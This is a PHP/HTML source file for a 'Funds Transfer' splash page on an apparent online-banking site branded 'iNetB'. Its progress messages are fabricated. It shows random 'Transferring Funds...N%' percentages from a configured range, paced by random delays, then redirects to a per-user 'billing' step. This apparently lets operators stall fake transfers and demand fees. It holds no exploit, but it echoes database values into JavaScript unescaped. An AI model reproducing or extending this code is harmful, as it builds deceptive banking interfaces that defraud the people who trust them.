<?php require('../brux.php'); require('is_restrict.php');
// if transaction id is set on URL
	if(!empty($_GET['transferID'])){
		$transfer = getTransfer('buid', $_GET['transferID'], 'fetchRow');
		if($transfer){
			// If transfer process_serial is default
			if($transfer['process_serial'] == 'default'){

				// If user's account billing is set to default
				if($userInfo['billing'] == 'default'){
					#Get default billing process from billing list
					$billing = getBilling('default', '', 'fetchRow');
				} 
				// If user's account billing is set to a value from billing list
				else {
					#Get billing process from user's set
					$billing = getBilling('buid', $userInfo['billing'], 'fetchRow');
				}
			}
			// If transfer process_serial is not default
			else {
				#Get billing process from transfer process_serial set
				$billing = getBilling('buid', $transfer['process_serial'], 'fetchRow');
			}
		}

		if($billing){
			$msgCount = mt_rand(3, 8);
			$range = range($billing['min_per'], $billing['max_per']);
			$range_value = array_flip($range);
			$percent = array_rand($range_value, $msgCount);
			$toNext = billingNext($billing['buid'], $_GET['transferID']);
		}
	}
	// when transaction id is not set on URL
	if(empty($_GET['transferID'])){
		echo '<meta http-equiv="Refresh" content="0; URL=dashboard.php">';
		die();
	} 
	// when transaction id is set on URL but not valid
	elseif(!$transfer){
		echo '<meta http-equiv="Refresh" content="0; URL=dashboard.php">';
		die();
	}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<title>Splash :: iNetB - <?php echo firm('name');?></title>
<?php include('../in_head.php');?>
<style type="text/css">
	#splashcontainer {
		width: 100%;
		position: absolute;
		margin: 40px auto 0;
	}
	.splashTD {
		width: 100%;
		min-height: 340px;
		margin: 0 auto;
		text-align: center;
		position: relative;
	}
	.splash {font-size: 1.3em; color: #2F72A8;}
</style>

<script>
//Specify the paths of the images to be used in the splash screen, if any or empty out array (ie: preloadimages=new Array())
var preloadimages = new Array()

//configure delay in milliseconds between each message (default: 2 seconds)
var intervals = <?php echo mt_rand(7000, 9000);?>

//configure destination URL
var targetdestination="<?php echo $toNext['url'];?>"

//configure messages to be displayed. If message contains apostrophe('), backslash them (ie: "I\'m fine")
var splashmessage = new Array()
var openingtags = '<div class="splash">'
splashmessage[<?php echo $i = 0;?>]='<h4>Initiating Transfer Wizard</h4>'
splashmessage[<?php echo ++$i?>]='<p>Launching The Secure Environment</p>'
splashmessage[<?php echo ++$i?>]='<p>Preparing To Transfer Funds</p>'
<?php $id=0; for($count = 1; $count <= $msgCount; $count++){?>
splashmessage[<?php echo ++$i?>]='Transferring Funds...<?php echo $percent[$id];?>%<br><img border="0" src="../brux/process.gif" width="170" height="14">'
<?php $id++;}?>
splashmessage[<?php echo ++$i?>]='<?php echo $toNext['msg'];?>'
var closingtags='</div>'

//Do not edit below this line (besides HTML code at the very bottom)

var i=0
var ns4=document.layers?1:0
var ie4=document.all?1:0
var ns6=document.getElementById&&!document.all?1:0
var theimages=new Array()

//pre-load images
if (document.images){
for (p=0;p<preloadimages.length;p++){
theimages[p]=new Image()
theimages[p].src=preloadimages[p]
}
}

function displaysplash(){
if (i<splashmessage.length){
sc_cross.style.visibility="hidden"
sc_cross.innerHTML=openingtags+splashmessage[i]+closingtags
sc_cross.style.left=ns6?parseInt(window.pageXOffset)+parseInt(window.innerWidth)/5-parseInt(sc_cross.style.width)/5 : document.body.scrollLeft+document.body.clientWidth/5-parseInt(sc_cross.style.width)/5
sc_cross.style.top=ns6?parseInt(window.pageYOffset)+parseInt(window.innerHeight)/5-sc_cross.offsetHeight/5 : document.body.scrollTop+document.body.clientHeight/5-sc_cross.offsetHeight/5
sc_cross.style.visibility="visible"
i++
}
else{
window.location=targetdestination
return
}
setTimeout("displaysplash()",intervals)
}

function displaysplash_ns(){
if (i<splashmessage.length){
sc_ns.visibility="hide"
sc_ns.document.write(openingtags+splashmessage[i]+closingtags)
sc_ns.document.close()

sc_ns.left=pageXOffset+window.innerWidth/5-sc_ns.document.width/5
sc_ns.top=pageYOffset+window.innerHeight/5-sc_ns.document.height/5

sc_ns.visibility="show"
i++
}
else{
window.location=targetdestination
return
}
setTimeout("displaysplash_ns()",intervals)
}



function positionsplashcontainer(){
if (ie4||ns6){
sc_cross=ns6?document.getElementById("splashcontainer"):document.all.splashcontainer
displaysplash()
}
else if (ns4){
sc_ns=document.splashcontainerns
sc_ns.visibility="show"
displaysplash_ns()
}
else
window.location=targetdestination
}
window.onload=positionsplashcontainer

</script> 
</head>

<body>
<div id="content">
	<div class="col-md-12">
		<div class="table-responsive">
			<table id="requiredInfo" class="record col-md-12">
			<tr>
				<th class="col-md-12 table-heading" colspan="12">Funds Transfer</th>
			</tr>
			<tr>
			<tr>
				<td class="col-md-12" colspan="12">
						<div class="splashTD">
	<div id="splashcontainer">

	</div>
	</div>
				</td>
			</tr>
			<tr>
				<th class="col-md-12" colspan="12" style="text-align: center;">
					<span class="warning">WARNING: Please do not refresh this page !!!</span>
				</th>
			</tr>
		</table>

		</div>
	</div>
</div>
</body>
</html>